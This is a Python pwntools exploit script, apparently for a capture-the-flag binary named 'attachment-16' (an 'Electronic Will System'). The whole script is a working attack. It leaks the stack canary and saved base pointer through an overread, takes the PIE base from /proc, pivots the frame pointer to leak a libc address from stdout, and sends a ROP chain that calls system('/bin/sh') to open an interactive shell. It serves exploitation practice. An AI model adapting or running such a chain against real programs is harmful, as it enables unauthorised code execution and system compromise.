#!/usr/bin/env python3
"""
Exploit for attachment-16 (Electronic Will System)
Binary: PIE, canary, Full RELRO, NX
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Binary offsets
PUTS_GADGET  = 0x1340
MAIN_LOOP    = 0x13c0
MAIN_RET     = 0x13ca

# Libc offsets
LIBC_SYSTEM  = 0x52290
LIBC_BIN_SH  = 0x1b45bd
LIBC_POP_RDI = 0x23b6a
LIBC_PUTS    = 0x84420
LIBC_STDOUT  = 0x1ed6a0

def exploit():
    io = process('./attachment-16')

    # ====== ITERATION 1: Leak canary + stack ======
    io.recvuntil(b'signature:')
    # 25 bytes: 24 'A' + newline overwrites canary null LSB
    io.send(b'A' * 24 + b'\n')

    io.recvuntil(b'signature:\n')
    raw = io.recvuntil(b'[System] Entering', drop=True)
    if raw.endswith(b'\n'):
        raw = raw[:-1]

    log.info(f"Leaked {len(raw)} bytes")

    canary = b'\x00' + raw[25:32]
    canary_val = u64(canary)
    log.success(f"Canary: {hex(canary_val)}")

    # Try to get main_rbp - might be truncated by null byte
    remaining = raw[32:]
    if len(remaining) >= 6:
        main_rbp = u64(remaining.ljust(8, b'\x00'))
        log.info(f"Main RBP: {hex(main_rbp)}")
    else:
        log.error("Not enough leak data")
        io.close()
        return

    # draft_will
    io.recvuntil(b'electronic will:')
    io.send(b'X' * 8)

    # Second read: 64 bytes - restore canary, keep saved_rbp, return to main loop
    io.recvuntil(b'(Debug Mode):')

    # But we don't know PIE yet! Main loop address = PIE + MAIN_LOOP
    # We need PIE first. For local testing, get it from /proc/pid/maps
    import os
    maps = open(f'/proc/{io.pid}/maps').read()
    for line in maps.split('\n'):
        if 'attachment-16' in line and 'r-x' in line:
            pie_base = int(line.split('-')[0], 16)
            break
    log.info(f"PIE base (from /proc): {hex(pie_base)}")

    payload2 = b'\x00' * 24
    payload2 += canary
    payload2 += p64(main_rbp)
    payload2 += p64(pie_base + MAIN_LOOP)
    payload2 = payload2.ljust(64, b'\x00')
    io.send(payload2)

    log.info("Iteration 1 complete - returned to main loop")

    # ====== ITERATION 2: Leak libc from stdout ======
    io.recvuntil(b'signature:')

    # First read: overwrite saved RBP with non-null to leak PIE (for remote)
    # But for local we already have PIE, so just get to second read
    io.send(b'C' * 24 + b'\n')

    io.recvuntil(b'signature:\n')
    io.recvuntil(b'[System] Entering', drop=True)
    io.recvuntil(b'electronic will:')
    io.send(b'D' * 8)

    io.recvuntil(b'(Debug Mode):')

    # Second read: set rbp to point to stdout for libc leak
    stdout_addr = pie_base + 0x4020  # stdout pointer in .data
    fake_rbp = stdout_addr + 0x20     # so rbp-0x20 = stdout_addr

    payload3 = b'\x00' * 24
    payload3 += canary
    payload3 += p64(fake_rbp)
    payload3 += p64(pie_base + PUTS_GADGET)
    payload3 = payload3.ljust(64, b'\x00')
    io.send(payload3)

    # Receive puts output (libc leak from stdout pointer)
    io.recvuntil(b'signature:\n')
    libc_raw = io.recvuntil(b'[System] Entering', drop=True)
    if libc_raw.endswith(b'\n'):
        libc_raw = libc_raw[:-1]

    stdout_ptr = u64(libc_raw[:6].ljust(8, b'\x00'))
    libc_base = stdout_ptr - LIBC_STDOUT
    log.success(f"Libc base: {hex(libc_base)}")

    # draft_will
    io.recvuntil(b'electronic will:')
    io.send(b'E' * 8)

    # Wait for the read that writes to data section
    io.recvuntil(b'(Debug Mode):')

    # Read writes to rbp-0x20 = stdout_addr = PIE + 0x4020
    # Build ROP chain (64 bytes)
    pop_rdi = libc_base + LIBC_POP_RDI
    bin_sh  = libc_base + LIBC_BIN_SH
    system  = libc_base + LIBC_SYSTEM

    payload4 = b'\x00' * 24         # junk
    payload4 += canary               # canary at offset 0x18
    payload4 += p64(0)               # rbp (don't care)
    payload4 += p64(pop_rdi)         # pop rdi; ret
    payload4 += p64(bin_sh)          # /bin/sh
    payload4 += p64(system)          # system
    payload4 = payload4.ljust(64, b'\x00')

    io.send(payload4)

    log.success("ROP chain sent!")
    io.interactive()

if __name__ == '__main__':
    exploit()
